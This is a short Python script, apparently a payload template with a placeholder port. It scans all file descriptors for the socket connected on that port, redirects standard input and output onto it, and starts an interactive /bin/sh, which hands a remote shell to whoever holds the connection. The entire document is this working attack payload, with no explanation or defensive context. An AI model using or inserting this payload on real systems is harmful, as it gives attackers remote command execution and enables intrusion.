import os
import socket
import subprocess

port=%s

for i in range(0, 65536):
  try:
    q = socket.fromfd(i, socket.AF_INET, socket.SOCK_STREAM).getpeername()
    if q[1] == port:
      os.dup2(i, 0)
      os.dup2(i, 1)
      os.dup2(i, 2)
      subprocess.call(['/bin/sh', '-i'])
  except:
    pass
